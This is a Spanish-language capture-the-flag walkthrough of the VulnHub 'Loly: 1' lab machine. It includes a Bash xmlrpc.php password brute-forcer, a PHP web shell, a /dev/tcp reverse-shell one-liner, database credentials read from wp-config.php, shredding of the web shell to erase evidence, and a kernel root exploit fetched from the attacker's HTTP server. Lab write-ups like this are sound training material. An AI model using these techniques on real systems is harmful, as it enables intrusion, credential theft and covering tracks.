---
layout: single
title: Loly 1 - VulnHub
excerpt: "La maquina Loly: 1 de la plataforma de Vulnhub es de dificultad facil donde tendremos que abusar de xmlrpc.php para poder obtener las credenciales de un usuario y despues de eso nos conectaremos al wordpress que usa la maquina para ganar acceso al sistema tendremos que abusar de una parte del wordpress en la que nos deja subir archivos AdRotate Manage Media al ganar acceso podremos ver las credenciales de un usuario y podremos migrar y para convertirnos en root tendremos que abusar de la version del kernel"
date: 2023-03-14
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/vh-writeup-loly/icon2.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
  - infosec
tags:  
  - Wordpress Enumeration
  - Abusing xmlrpc.php
  - Bash scripting
  - Kernel Exploitation (Linux Kernel < 4.13.9 - Local Privilege Escalation)
  - Abusing AdRotate Manage Media
---

<p align="center">
<img src="/assets/images/vh-writeup-loly/icon.png">
</p>


```bash
❯ arp-scan -I ens33 --localnet --ignoredups | grep VMware
192.168.100.35	00:0c:29:26:b5:d2	VMware, Inc.
```

```bash
❯ whichSystem.py 192.168.100.35

192.168.100.35 (ttl -> 64): Linux
```

## PortScan

```bash
❯ nmap -sCV -p80 192.168.100.35 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-14 17:25 CST
Nmap scan report for 192.168.100.35
Host is up (0.00038s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.10.3 (Ubuntu)
MAC Address: 00:0C:29:26:B5:D2 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```bash
❯ nmap --script=http-enum -p80 192.168.100.35 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-14 17:26 CST
Nmap scan report for 192.168.100.35
Host is up (0.00030s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /wordpress/: Blog
|_  /wordpress/wp-login.php: Wordpress login page.
MAC Address: 00:0C:29:26:B5:D2 (VMware)

```

## Enumeration

Bueno solo hay un puerto abierto que es el `80` ademas `nmap` nos reporta 2 rutas la cual nos indica que muy posiblemente haya un `wordpress`

Asi es la pagina web por defecto 

![](/assets/images/vh-writeup-loly/Web1.png)

Vamos a ver las rutas que nos reporto `nmap` 

Y si es un `wordpress` solo que no estan cargando bien los recursos

![](/assets/images/vh-writeup-loly/Web2.png)

Si vemos el codigo fuente los recursos se estan cargando de la ruta `loly.lc` asi que los vamos agregar al `/etc/hosts`

![](/assets/images/vh-writeup-loly/Web3.png)

```bash
❯ nvim /etc/hosts
❯ ping -c 1 loly.lc
PING loly.lc (192.168.100.35) 56(84) bytes of data.
64 bytes from loly.lc (192.168.100.35): icmp_seq=1 ttl=64 time=0.322 ms

--- loly.lc ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.322/0.322/0.322/0.000 ms
❯ catn /etc/hosts | tail -n 1
192.168.100.35 loly.lc
```

Ahora asi podemos ver los recursos correctamente

![](/assets/images/vh-writeup-loly/Web4.png)

Es un `wordpress` de version `5.5`

```ruby
❯ whatweb http://loly.lc/wordpress
http://loly.lc/wordpress [301 Moved Permanently] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.10.3 (Ubuntu)], IP[192.168.100.35], RedirectLocation[http://loly.lc/wordpress/], Title[301 Moved Permanently], nginx[1.10.3]
http://loly.lc/wordpress/ [200 OK] Bootstrap[3.3.6], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.10.3 (Ubuntu)], IP[192.168.100.35], JQuery, MetaGenerator[WordPress 5.5], Script[text/javascript], Title[Loly &#8211; Just another WordPress site], UncommonHeaders[link], WordPress[5.5], nginx[1.10.3]
```

Y bueno en la web nos indican que hay una `author` que es `loly` `nmap` nos reporto una ruta donde hay un panel de `login`

Podemos hacer fuerza bruta por que tenemos un usuario que es `loly` usando `wpscan` pero por el momento no lo haremos vamos a ver los plugins

![](/assets/images/vh-writeup-loly/Web5.png)

Si nos vamos a la pagina de `Hacktriks` <https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress> nos dicen que hay un archivo `xmlrpc.php` :
<span style="color:yellow">xmlrpc.php is a file that represents a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress</span>

Acepta peticiones solo por `POST`

![](/assets/images/vh-writeup-loly/Web6.png)

Y bueno solamente se esta utilizando un solo plugin que es `androtate`

```bash
❯ curl -s -X POST "http://loly.lc/wordpress/" | grep -oP 'plugins/\K[^/]+'
adrotate
```

Si pruebas buscando vulnerabilidades ya les adelanto que no funcionan en esta ocasion

```bash
❯ searchsploit adrotate
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
WordPress Plugin AdRotate 3.6.5 - SQL Injection                                               | php/webapps/17888.txt
WordPress Plugin AdRotate 3.6.6 - SQL Injection                                               | php/webapps/18114.txt
WordPress Plugin AdRotate 3.9.4 - 'clicktracker.ph?track' SQL Injection                       | php/webapps/31834.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Si hacemos una peticion por `POST` nos dice eso es una estructura en `xml` nos dice que esta mal ya que esta esperando un archivo por que le tenemos que pasar en una estructura `xml`


```bash
❯ curl -s -X POST "http://loly.lc/wordpress/xmlrpc.php"
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>-32700</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>parse error. not well formed</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>
```

Aqui nos explican como hacerlo <https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/>

Y bueno en la parte de `BruteForce` nos dice que podemos hasta probar usuario y contraseñas validas si es valida o no

![](/assets/images/vh-writeup-loly/Web7.png)

Vamos a hacer una prueba vamos a crear un archivo `data.xml` que contenga una estructura como lo muestra en la pagina web

Podemos listar los metodos

```bash
❯ nvim data.xml
❯ catn data.xml
<?xml version="1.0" encoding="utf-8"?> 
<methodCall> 
<methodName>system.listMethods</methodName> 
<params></params> 
</methodCall>
❯ curl -s -X POST "http://loly.lc/wordpress/xmlrpc.php" -d@data.xml
<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><string>system.multicall</string></value>
  <value><string>system.listMethods</string></value>
  <value><string>system.getCapabilities</string></value>
  <value><string>demo.addTwoNumbers</string></value>
  <value><string>demo.sayHello</string></value>
  <value><string>pingback.extensions.getPingbacks</string></value>
  <value><string>pingback.ping</string></value>
  <value><string>mt.publishPost</string></value>
  <value><string>mt.getTrackbackPings</string></value>
  <value><string>mt.supportedTextFilters</string></value>
  <value><string>mt.supportedMethods</string></value>
  <value><string>mt.setPostCategories</string></value>
  <value><string>mt.getPostCategories</string></value>
  <value><string>mt.getRecentPostTitles</string></value>
  <value><string>mt.getCategoryList</string></value>
  <value><string>metaWeblog.getUsersBlogs</string></value>
  <value><string>metaWeblog.deletePost</string></value>
  <value><string>metaWeblog.newMediaObject</string></value>
  <value><string>metaWeblog.getCategories</string></value>
  <value><string>metaWeblog.getRecentPosts</string></value>
  <value><string>metaWeblog.getPost</string></value>
  <value><string>metaWeblog.editPost</string></value>
  <value><string>metaWeblog.newPost</string></value>
  <value><string>blogger.deletePost</string></value>
  <value><string>blogger.editPost</string></value>
  <value><string>blogger.newPost</string></value>
  <value><string>blogger.getRecentPosts</string></value>
  <value><string>blogger.getPost</string></value>
  <value><string>blogger.getUserInfo</string></value>
  <value><string>blogger.getUsersBlogs</string></value>
  <value><string>wp.restoreRevision</string></value>
  <value><string>wp.getRevisions</string></value>
  <value><string>wp.getPostTypes</string></value>
  <value><string>wp.getPostType</string></value>
  <value><string>wp.getPostFormats</string></value>
  <value><string>wp.getMediaLibrary</string></value>
  <value><string>wp.getMediaItem</string></value>
  <value><string>wp.getCommentStatusList</string></value>
  <value><string>wp.newComment</string></value>
  <value><string>wp.editComment</string></value>
  <value><string>wp.deleteComment</string></value>
  <value><string>wp.getComments</string></value>
  <value><string>wp.getComment</string></value>
  <value><string>wp.setOptions</string></value>
  <value><string>wp.getOptions</string></value>
  <value><string>wp.getPageTemplates</string></value>
  <value><string>wp.getPageStatusList</string></value>
  <value><string>wp.getPostStatusList</string></value>
  <value><string>wp.getCommentCount</string></value>
  <value><string>wp.deleteFile</string></value>
  <value><string>wp.uploadFile</string></value>
  <value><string>wp.suggestCategories</string></value>
  <value><string>wp.deleteCategory</string></value>
  <value><string>wp.newCategory</string></value>
  <value><string>wp.getTags</string></value>
  <value><string>wp.getCategories</string></value>
  <value><string>wp.getAuthors</string></value>
  <value><string>wp.getPageList</string></value>
  <value><string>wp.editPage</string></value>
  <value><string>wp.deletePage</string></value>
  <value><string>wp.newPage</string></value>
  <value><string>wp.getPages</string></value>
  <value><string>wp.getPage</string></value>
  <value><string>wp.editProfile</string></value>
  <value><string>wp.getProfile</string></value>
  <value><string>wp.getUsers</string></value>
  <value><string>wp.getUser</string></value>
  <value><string>wp.getTaxonomies</string></value>
  <value><string>wp.getTaxonomy</string></value>
  <value><string>wp.getTerms</string></value>
  <value><string>wp.getTerm</string></value>
  <value><string>wp.deleteTerm</string></value>
  <value><string>wp.editTerm</string></value>
  <value><string>wp.newTerm</string></value>
  <value><string>wp.getPosts</string></value>
  <value><string>wp.getPost</string></value>
  <value><string>wp.deletePost</string></value>
  <value><string>wp.editPost</string></value>
  <value><string>wp.newPost</string></value>
  <value><string>wp.getUsersBlogs</string></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>
```

De primeras si quieras hacer fuerza bruta directamente puedes usar la herramienta `wpscan` y el `rockyou` para probar las contraseñas por que tienes un usuario, cuando usas una herramienta que te automatiza todo pues es mas facil la explotacion

```bash
❯ wpscan --url http://loly.lc/wordpress -U loly -P /usr/share/wordlists/rockyou.txt
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://loly.lc/wordpress/ [192.168.100.35]
[+] Started: Tue Mar 14 18:11:58 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: nginx/1.10.3 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://loly.lc/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://loly.lc/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://loly.lc/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.5 identified (Insecure, released on 2020-08-11).
 | Found By: Rss Generator (Passive Detection)
 |  - http://loly.lc/wordpress/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.5</generator>
 | Confirmed By: Emoji Settings (Passive Detection)
 |  - http://loly.lc/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=5.5'

[+] WordPress theme in use: feminine-style
 | Location: http://loly.lc/wordpress/wp-content/themes/feminine-style/
 | Last Updated: 2022-02-16T00:00:00.000Z
 | Readme: http://loly.lc/wordpress/wp-content/themes/feminine-style/readme.txt
 | [!] The version is out of date, the latest version is 3.0.3
 | Style URL: http://loly.lc/wordpress/wp-content/themes/feminine-style/style.css?ver=5.5
 | Style Name: Feminine Style
 | Style URI: https://www.acmethemes.com/themes/feminine-style
 | Description: Feminine Style is a voguish, dazzling and very appealing WordPress theme. The theme is completely wo...
 | Author: acmethemes
 | Author URI: https://www.acmethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.0 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://loly.lc/wordpress/wp-content/themes/feminine-style/style.css?ver=5.5, Match: 'Version: 1.0.0'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] adrotate
 | Location: http://loly.lc/wordpress/wp-content/plugins/adrotate/
 | Last Updated: 2023-01-27T21:19:00.000Z
 | [!] The version is out of date, the latest version is 5.11
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 5.8.6.2 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://loly.lc/wordpress/wp-content/plugins/adrotate/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:00 <=================================================> (137 / 137) 100.00% Time: 00:00:00

[i] No Config Backups Found.

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - loly / fernando                                                                                                     
Trying loly / corazon Time: 00:00:02 <                                                  > (175 / 14344567)  0.00%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: loly, Password: fernando

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Mar 14 18:12:09 2023
[+] Requests Done: 316
[+] Cached Requests: 38
[+] Data Sent: 128.746 KB
[+] Data Received: 128.072 KB
[+] Memory used: 253.742 MB
[+] Elapsed time: 00:00:10
```

`loly:fernando`

Pero hay otra forma de hacerlo haciendo un script en `Bash` que desarrollo `Savitar`
<https://github.com/s4vitar>
enviando el `xml` para que tambien use el `rockyou` y nos reporte la contraseña del usuario el script mediante parametros le pasas el `wordlist` que es el `rockyou` y mediante la estrucutra `xml` se encarga de hacer lo que hico `wpscan` para darnos la `password` abusando del `xmlrpc`

```bash
#!/bin/bash

# Colores
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n"
  rm data.xml 2>/dev/null
  tput cnorm; exit 1
}

# Ctrl+C
trap ctrl_c SIGINT

function helpPanel(){
  echo -e "\n${yellowColour}[+]${grayColour} Uso:${blueColour} $0${turquoiseColour} -u${redColour} usuario${turquoiseColour} -w${redColour} wordlist_path${endColour}\n"
  echo -e "\t${purpleColour}-u)${grayColour} Usuario a probar${endColour}"
  echo -e "\t${purpleColour}-w)${grayColour} Ruta del diccionario a probar${endColour}"
  tput cnorm; exit 1
}

declare -i parameter_counter=0

tput civis

while getopts "u:w:h" arg; do
  case $arg in
    u) username=$OPTARG && let parameter_counter+=1;; 
    w) wordlist=$OPTARG && let parameter_counter+=1;;
    h) helpPanel
  esac
done

function makeXML(){
  username=$1
  wordlist=$2

  cat $wordlist | while read password; do
    xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>loly</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>
"""

  echo $xmlFile > data.xml

  response=$(curl -s -X POST "http://loly.lc/wordpress/xmlrpc.php" -d@data.xml)

  if [ ! "$(echo $response | grep -E 'Incorrect username or password.|parse error. not well formed')" ]; then
    echo -e "\n${yellowColour}[+] ${grayColour}La contraseña es ${blueColour}$password${endColour}"
    rm data.xml 2>/dev/null
    tput cnorm && exit 0
  fi
  done
}

if [ $parameter_counter -eq 2 ]; then
  if [ -f $wordlist ]; then
    makeXML $username $wordlist
  else
    echo -e "\n\n${redColour}[!] El archivo no existe${endColour}\n"
  fi
else
  helpPanel
fi

rm data.xml 2>/dev/null
tput cnorm
```

Funciona tambien y asi puedes explotarlo manualmente

```bash
❯ chmod +x xmlrpc_bruteforce.sh
❯ ./xmlrpc_bruteforce.sh -u usuario -w /usr/share/wordlists/rockyou.txt

[+] La contraseña es fernando
```

Ahora podemos logearnos en el panel de login de `wordpress`

Y ganamos acceso

![](/assets/images/vh-writeup-loly/Web8.png)

Podemos subir contenido nos dice que podemos subir un comprimido pero no sabemos si cuando lo subimos lo comprime aunque en la web nos dicen que si lo hace asi que para estar seguros podemos hacer una prueba 

![](/assets/images/vh-writeup-loly/Web9.png)

```bash
❯ catn xd.txt
Vamos a hacer una prueba
❯ zip comprimido.zip xd.txt
  adding: xd.txt (stored 0%)
❯ 7z l comprimido.zip

7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
p7zip Version 16.02 (locale=es_MX.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-1035G1 CPU @ 1.00GHz (706E5),ASM,AES-NI)

Scanning the drive for archives:
1 file, 187 bytes (1 KiB)

Listing archive: comprimido.zip

--
Path = comprimido.zip
Type = zip
Physical Size = 187

   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2023-03-14 18:31:30 .....           25           25  xd.txt
------------------- ----- ------------ ------------  ------------------------
2023-03-14 18:31:30                 25           25  1 files

```

Si se subio y si vamos a ver si lo descomprimio

![](/assets/images/vh-writeup-loly/Web10.png)

Y funciona asi que ahora podemos ganar acceso al sistema 

![](/assets/images/vh-writeup-loly/Web11.png)

Vamos a subirlo a ver si funciona

```bash
❯ nvim cmd.php
❯ catn cmd.php
<?php
  echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
❯ rm comprimido.zip
❯ zip comprimido.zip cmd.php
  adding: cmd.php (deflated 3%)
```

Funciona

![](/assets/images/vh-writeup-loly/Web12.png)

Ahora vamos a enviarnos una reverse shell a nuestra maquina de atacante

Primero nos ponemos en escucha por un puerto 

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
   
```

Ahora solo escribe la reverse shell y le das al `ENTER` para ganar acceso

```
?cmd=bash -c "bash -i >%26 /dev/tcp/tuip/443 0>%261"
```

```bash
❯ nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.100.15] from (UNKNOWN) [192.168.100.35] 41170
bash: cannot set terminal process group (4116): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:~/html/wordpress/wp-content/banners$ whoami
whoami
www-data
www-data@ubuntu:~/html/wordpress/wp-content/banners$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@ubuntu:~/html/wordpress/wp-content/banners$ 

```

Ahora ejecuta estos comandos para poder hacer `CTRL+C`

```bash
script /dev/null -c bash
CTRL+Z
stty raw echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

## Escalada de privilegios

Podemos ver la contraseña de la base de datos

```bash
www-data@ubuntu:~/html/wordpress$ cat wp-config.php 
<?php
/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the
 * installation. You don't have to use the web site, you can
 * copy this file to "wp-config.php" and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** MySQL database username */
define( 'DB_USER', 'wordpress' );

/** MySQL database password */
define( 'DB_PASSWORD', 'lolyisabeautifulgirl' );
```

Vamos a borrar la evidencia con la que ganamos acceso

```bash
www-data@ubuntu:~/html/wordpress/wp-content/banners$ ls
cmd.php  xd.txt
www-data@ubuntu:~/html/wordpress/wp-content/banners$ shred -zun 10 -v cmd.php 
shred: cmd.php: pass 1/11 (random)...
shred: cmd.php: pass 2/11 (db6db6)...
shred: cmd.php: pass 3/11 (ffffff)...
shred: cmd.php: pass 4/11 (492492)...
shred: cmd.php: pass 5/11 (000000)...
shred: cmd.php: pass 6/11 (random)...
shred: cmd.php: pass 7/11 (6db6db)...
shred: cmd.php: pass 8/11 (aaaaaa)...
shred: cmd.php: pass 9/11 (555555)...
shred: cmd.php: pass 10/11 (random)...
shred: cmd.php: pass 11/11 (000000)...
shred: cmd.php: removing
shred: cmd.php: renamed to 0000000
shred: 0000000: renamed to 000000
shred: 000000: renamed to 00000
shred: 00000: renamed to 0000
shred: 0000: renamed to 000
shred: 000: renamed to 00
shred: 00: renamed to 0
shred: cmd.php: removed
www-data@ubuntu:~/html/wordpress/wp-content/banners$ 
```

Nos dan una contraseña vamos a probar si podemos migrar al usuario `loly`

`loly:lolyisabeautifulgirl`

```bash
www-data@ubuntu:/home/loly$ su loly
Password: 
loly@ubuntu:~$ whoami
loly
loly@ubuntu:~$ id
uid=1000(loly) gid=1000(loly) groups=1000(loly),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
loly@ubuntu:~$ 
```

Nada interesante

```bash
loly@ubuntu:/$ find / -perm -4000 2>/dev/null
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/sudo
/bin/su
/bin/ntfs-3g
/bin/umount
/bin/ping6
/bin/ping
/bin/fusermount
/bin/mount
loly@ubuntu:/$ 
```

Las capabilities no son interesantes

```bash
loly@ubuntu:/$ getcap -r / 2>/dev/null
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep
/usr/bin/mtr = cap_net_raw+ep
loly@ubuntu:/$ 

```

Solo estan esos puertos abiertos aparte el de  `mysql` 

```bash
loly@ubuntu:/$ ss -nltp
State       Recv-Q Send-Q                   Local Address:Port                                  Peer Address:Port              
LISTEN      0      128                          127.0.0.1:3306                                             *:*                  
LISTEN      0      128                                  *:80                                               *:*                  
LISTEN      0      128                                 :::80                                              :::*                  
loly@ubuntu:/$ 
```

No tenemos ningun privilegio a nivel de sudoers

```bash
loly@ubuntu:/$ sudo -l
[sudo] password for loly: 
Sorry, user loly may not run sudo on ubuntu.
loly@ubuntu:/$ 

```

Si hacemos un `uname -a` la version del kernel esta desactualizada

```bash
❯ searchsploit ubuntu 4.4.0 privilege escalation
---------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                |  Path
---------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalat | linux_x86-64/local/40871.c
Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation                           | linux/local/41458.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege  | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privil | windows_x86-64/local/47170.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                 | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                        | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escala | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privile | linux/local/47169.c
Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation        | linux/local/41760.txt
---------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Vamos a usar este la version que tiene la maquina es menor a esa 

```bash
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                 | linux/local/45010.c
```

Estamos en la version `16.04`

```bash
loly@ubuntu:/$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 16.04.1 LTS
Release:	16.04
Codename:	xenial
loly@ubuntu:/$ 
```

Esta programado en el lenguaje `C`

```bash
❯ searchsploit -m linux/local/45010.c
  Exploit: Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/45010
     Path: /usr/share/exploitdb/exploits/linux/local/45010.c
File Type: C source, ASCII text
```

Si les las intrucciones tenemos que compilarlo primero 

```bash
❯ gcc 45010.c -o exploit
❯ ls
 45010.c   exploit
```

Ahora vamos a pasarlo a la maquina

```bash
❯ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.100.35 - - [14/Mar/2023 19:53:08] "GET /exploit HTTP/1.1" 200 -


```

En caso de tener problemas pasa el script en `c` a la maquina y en la maquina victima has el `gcc` y dale permisos `777` si es que no te funciona

```bash
loly@ubuntu:/tmp$ chmod +x exploit
loly@ubuntu:/tmp$ ./exploit 
[.] 
[.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)
[.] 
[.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **
[.] 
[*] creating bpf map
[*] sneaking evil bpf past the verifier
[*] creating socketpair()
[*] attaching bpf backdoor to socket
[*] skbuff => ffff88003570bd00
[*] Leaking sock struct from ffff8800728ae900
[*] Sock->sk_rcvtimeo at offset 472
[*] Cred structure at ffff8800729ed680
[*] UID from cred structure: 1000, matches the current: 1000
[*] hammering cred structure at ffff8800729ed680
[*] credentials patched, launching shell...
# whoami
root
# bash
root@ubuntu:/tmp# cd /home
root@ubuntu:/home# ls
loly
root@ubuntu:/home# cd /root
root@ubuntu:/root# ls
root.txt
root@ubuntu:/root# cat root.txt 
  ____               ____ ____  ____  
 / ___| _   _ _ __  / ___/ ___||  _ \ 
 \___ \| | | | '_ \| |   \___ \| |_) |
  ___) | |_| | | | | |___ ___) |  _ < 
 |____/ \__,_|_| |_|\____|____/|_| \_\
                                      
Congratulations. I'm BigCityBoy
root@ubuntu:/root# 
```
































